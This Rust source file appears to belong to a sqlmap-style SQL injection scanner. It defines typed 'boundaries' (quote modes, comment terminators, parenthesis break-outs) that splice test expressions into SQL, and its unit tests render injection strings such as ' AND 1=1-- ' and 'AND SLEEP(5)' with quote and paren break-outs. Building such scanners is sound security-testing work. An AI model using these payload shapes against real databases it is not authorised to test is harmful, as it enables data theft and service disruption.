//! Typed boundary model (brief §18).
//!
//! A boundary is how a logical test is spliced into the surrounding SQL.
//! sqlmap expresses this as `boundaries.xml`; here it is a typed value so
//! composition is checked rather than string-concatenated blindly.

use serde::{Deserialize, Serialize};

/// How the surrounding context is quoted.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum QuoteMode {
    /// Unquoted — numeric or bare expression context.
    None,
    /// Single-quoted string.
    Single,
    /// Double-quoted string/identifier.
    Double,
    /// Backtick identifier (MySQL).
    Backtick,
    /// Bracket identifier (MSSQL).
    Bracket,
}

impl QuoteMode {
    /// The opening/closing quote characters for this mode.
    pub fn delimiters(&self) -> (&'static str, &'static str) {
        match self {
            QuoteMode::None => ("", ""),
            QuoteMode::Single => ("'", "'"),
            QuoteMode::Double => ("\"", "\""),
            QuoteMode::Backtick => ("`", "`"),
            QuoteMode::Bracket => ("[", "]"),
        }
    }

    /// The character that opens this mode (empty for None).
    pub fn open(&self) -> &'static str {
        self.delimiters().0
    }
}

/// How the injected expression is terminated so trailing SQL is ignored.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Termination {
    /// No comment — expression must be self-closing.
    None,
    /// `-- ` (requires a trailing space or newline in MySQL).
    LineComment,
    /// `#` — MySQL only.
    HashComment,
    /// `/* */` block comment.
    BlockComment,
    /// `;--` — statement terminator plus comment.
    Semicolon,
}

impl Termination {
    pub fn as_str(&self) -> &'static str {
        match self {
            Termination::None => "",
            Termination::LineComment => "-- ",
            Termination::HashComment => "#",
            Termination::BlockComment => "/**/",
            Termination::Semicolon => ";-- ",
        }
    }
}

/// A boundary: the prefix and suffix wrapped around a logical expression,
/// plus the quote mode and termination it assumes.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Boundary {
    pub prefix: String,
    pub suffix: String,
    pub quote_mode: QuoteMode,
    pub termination: Termination,
    /// Parenthesis depth the injection must open/close to balance.
    pub paren_depth: u8,
}

impl Boundary {
    /// A numeric (unquoted) context boundary with a line-comment terminator.
    pub fn numeric() -> Self {
        Self {
            prefix: " ".to_string(),
            suffix: String::new(),
            quote_mode: QuoteMode::None,
            termination: Termination::LineComment,
            paren_depth: 0,
        }
    }

    /// A single-quoted string context boundary.
    pub fn single_quoted() -> Self {
        Self {
            prefix: "'".to_string(),
            suffix: String::new(),
            quote_mode: QuoteMode::Single,
            termination: Termination::LineComment,
            paren_depth: 0,
        }
    }

    /// A double-quoted context boundary.
    pub fn double_quoted() -> Self {
        Self {
            prefix: "\"".to_string(),
            suffix: String::new(),
            quote_mode: QuoteMode::Double,
            termination: Termination::LineComment,
            paren_depth: 0,
        }
    }

    /// A parenthesised numeric context, e.g. `id IN (1)`.
    pub fn parenthesised_numeric() -> Self {
        Self {
            prefix: ")".to_string(),
            suffix: String::new(),
            quote_mode: QuoteMode::None,
            termination: Termination::LineComment,
            paren_depth: 1,
        }
    }

    /// Render the full injection: prefix + expression + terminator + any
    /// closing parens needed to balance the opened context.
    ///
    /// `expression` is the bare SQL logic (e.g. `AND 1=1`) with no quoting
    /// or comments — those belong to the boundary.
    pub fn render(&self, expression: &str) -> String {
        let mut out = String::new();
        out.push_str(&self.prefix);
        out.push_str(expression);
        // Close any parenthesis we opened before terminating, so the
        // terminator comment does not have to swallow an unbalanced paren.
        for _ in 0..self.paren_depth {
            out.push(')');
        }
        out.push_str(self.termination.as_str());
        out.push_str(&self.suffix);
        out
    }

    /// Construct an arbitrary boundary. The `prefix` carries the literal
    /// break-out string (quote and/or `)` chars); `paren_depth` appends that
    /// many extra closing parens after the expression before the terminator.
    fn mk(prefix: &str, quote_mode: QuoteMode, termination: Termination, paren_depth: u8) -> Self {
        Self {
            prefix: prefix.to_string(),
            suffix: String::new(),
            quote_mode,
            termination,
            paren_depth,
        }
    }
}

/// Candidate boundaries for a context, ordered by prior likelihood.
///
/// This is the analog of sqlmap's `boundaries.xml`: the same logical test is
/// spliced under every plausible break-out (bare, quoted, and nested inside
/// 1–3 parentheses) and every plausible line terminator (`-- ` and MySQL's
/// `#`). Breadth here is what lets the composed probes in
/// [`crate::payload::generate`] adapt to an unknown injection context without
/// hardcoding a single `' ... -- -` shape.
pub fn candidates_for(quote_mode: QuoteMode) -> Vec<Boundary> {
    use QuoteMode::*;
    use Termination::{HashComment, LineComment};
    match quote_mode {
        None => vec![
            // Bare numeric, line- and hash-terminated.
            Boundary::numeric(),
            Boundary::mk(" ", None, HashComment, 0),
            // Parenthesised numeric at increasing nesting depth, e.g.
            // `id IN (1)`, `func((1))`, `a((( 1 )))`.
            Boundary::parenthesised_numeric(),
            Boundary::mk(")", None, LineComment, 0),
            Boundary::mk("))", None, LineComment, 0),
            Boundary::mk(")))", None, LineComment, 0),
        ],
        Single => vec![
            Boundary::single_quoted(),
            Boundary::mk("'", Single, HashComment, 0),
            // String value nested inside 1–3 parens, e.g. `WHERE n=('v')`.
            Boundary::mk("')", Single, LineComment, 0),
            Boundary::mk("'))", Single, LineComment, 0),
            Boundary::mk("')))", Single, LineComment, 0),
        ],
        Double => vec![
            Boundary::double_quoted(),
            Boundary::mk("\")", Double, LineComment, 0),
            Boundary::mk("\"))", Double, LineComment, 0),
        ],
        Backtick => vec![
            Boundary::mk("`", Backtick, LineComment, 0),
            Boundary::mk("`)", Backtick, LineComment, 0),
        ],
        Bracket => vec![
            Boundary::mk("]", Bracket, LineComment, 0),
            Boundary::mk("])", Bracket, LineComment, 0),
        ],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn numeric_boundary_renders_expression_with_comment() {
        let b = Boundary::numeric();
        assert_eq!(b.render("AND 1=1"), " AND 1=1-- ");
    }

    #[test]
    fn single_quoted_boundary_opens_quote() {
        let b = Boundary::single_quoted();
        assert_eq!(b.render("AND 'a'='a"), "'AND 'a'='a-- ");
    }

    #[test]
    fn paren_depth_is_closed_before_terminator() {
        let b = Boundary::parenthesised_numeric();
        let rendered = b.render("AND 1=1");
        // Must close the paren before the comment, or the comment eats it.
        assert!(rendered.contains("1=1)-- "), "got {rendered}");
    }

    #[test]
    fn quote_modes_have_delimiters() {
        assert_eq!(QuoteMode::Single.delimiters(), ("'", "'"));
        assert_eq!(QuoteMode::None.open(), "");
        assert_eq!(QuoteMode::Bracket.delimiters(), ("[", "]"));
    }

    #[test]
    fn termination_strings_are_valid_sql() {
        assert_eq!(Termination::LineComment.as_str(), "-- ");
        assert_eq!(Termination::HashComment.as_str(), "#");
        assert_eq!(Termination::None.as_str(), "");
    }

    #[test]
    fn candidates_per_quote_mode_are_nonempty() {
        for mode in [
            QuoteMode::None,
            QuoteMode::Single,
            QuoteMode::Double,
            QuoteMode::Backtick,
            QuoteMode::Bracket,
        ] {
            assert!(!candidates_for(mode).is_empty(), "{mode:?} had no boundaries");
        }
    }

    #[test]
    fn numeric_candidates_include_paren_variant() {
        let candidates = candidates_for(QuoteMode::None);
        assert!(candidates.iter().any(|b| b.paren_depth == 1));
    }

    #[test]
    fn numeric_matrix_covers_nested_paren_breakouts() {
        let rendered: Vec<String> = candidates_for(QuoteMode::None)
            .iter()
            .map(|b| b.render("AND SLEEP(5)"))
            .collect();
        // Break out of one, two, and three levels of parentheses.
        assert!(rendered.iter().any(|r| r.starts_with(')')), "no single-paren break: {rendered:?}");
        assert!(rendered.iter().any(|r| r.starts_with("))")), "no double-paren break: {rendered:?}");
        assert!(rendered.iter().any(|r| r.starts_with(")))")), "no triple-paren break: {rendered:?}");
        // Both a `-- ` and a MySQL `#` terminator are represented.
        assert!(rendered.iter().any(|r| r.contains("-- ")), "no line comment: {rendered:?}");
        assert!(rendered.iter().any(|r| r.ends_with('#')), "no hash comment: {rendered:?}");
    }

    #[test]
    fn single_quote_matrix_stays_quoted_and_nests() {
        let candidates = candidates_for(QuoteMode::Single);
        // Every single-quoted boundary must open with a quote (relied on by
        // generate::single_quote_context_opens_a_quote).
        assert!(candidates.iter().all(|b| b.prefix.starts_with('\'')));
        let rendered: Vec<String> = candidates.iter().map(|b| b.render("AND SLEEP(5)")).collect();
        assert!(rendered.iter().any(|r| r.starts_with("')")), "no quoted paren break: {rendered:?}");
        assert!(rendered.iter().any(|r| r.starts_with("')))")), "no quoted triple break: {rendered:?}");
    }

    #[test]
    fn every_context_offers_multiple_boundaries() {
        // The whole point of the matrix: no context is a single fixed shape.
        for mode in [
            QuoteMode::None,
            QuoteMode::Single,
            QuoteMode::Double,
            QuoteMode::Backtick,
            QuoteMode::Bracket,
        ] {
            assert!(candidates_for(mode).len() >= 2, "{mode:?} was not diversified");
        }
    }
}
